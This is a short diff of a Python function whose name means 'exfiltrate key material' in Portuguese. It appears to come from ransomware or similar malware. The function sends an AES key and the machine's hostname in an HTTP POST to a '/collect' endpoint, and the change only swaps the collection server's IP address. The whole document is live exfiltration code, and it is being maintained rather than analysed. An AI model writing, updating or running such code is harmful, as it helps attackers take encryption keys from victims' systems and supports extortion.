@@ -184,7 +184,7 @@ def exfiltrar_material_da_chave() -> bool:
         return False
 
     payload = {"aes_key": aes_key, "hostname": hostname}
-    url = "http://10.150.3.162:8080/collect"
+    url = "http://10.254.19.191:8080/collect"
     try:
         response = requests.post(url, json=payload, timeout=10)
         response.raise_for_status()
